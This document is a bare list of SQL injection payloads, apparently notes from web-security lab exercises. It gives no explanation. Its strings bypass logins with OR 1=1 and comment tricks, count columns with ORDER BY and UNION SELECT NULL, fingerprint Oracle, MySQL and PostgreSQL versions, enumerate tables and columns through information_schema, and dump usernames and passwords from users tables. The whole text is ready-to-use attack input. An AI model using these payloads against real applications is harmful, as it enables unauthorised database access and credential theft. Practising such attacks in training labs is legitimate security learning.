test' OR 1=1 --
administrator'--
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,'searchstring',NULL--
'+UNION+SELECT+NULL,'administrator'+||+'~'+||+password+FROM+users--
' UNION SELECT username,password FROM users --
' UNION SELECT BANNER, NULL FROM v$version--
' UNION SELECT password,username || '~' || password FROM users--
'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--
'UNION SELECT @@version--
'UNION SELECT * FROM v$version--
'UNION SELECT version()--
'+UNION+SELECT+@@version,+NULL#
%27+UNION+SELECT+@@version,+NULL%23

'SELECT * FROM information_schema.tables--
'SELECT NULL,NULL FROM information_schema.tables--
'SELECT * FROM information_schema.columns WHERE table_name = 'Users'--

'UNION SELECT NULL,NULL FROM information_schema.tables--

'+UNION+SELECT+username,password+FROM+users--

'UNION+SELECT+@@version--
'UNION+SELECT+*+FROM+v$version--
'UNION+SELECT+version()--

'UNION SELECT TABLE_NAME,'a' FROM information_schema.tables--
'UNION SELECT TABLE_NAME,COLUMNS FROM information_schema.tables--
'UNION SELECT TABLE_NAME FROM information_schema.columns WHERE table_name = 'users_neught'--
'UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns--
'UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users_neught'--

'UNION SELECT username_hkqvsd,password_arswcp FROM users_neught--

'UNION SELECT TABLE_NAME,'a' FROM information_schema.tables--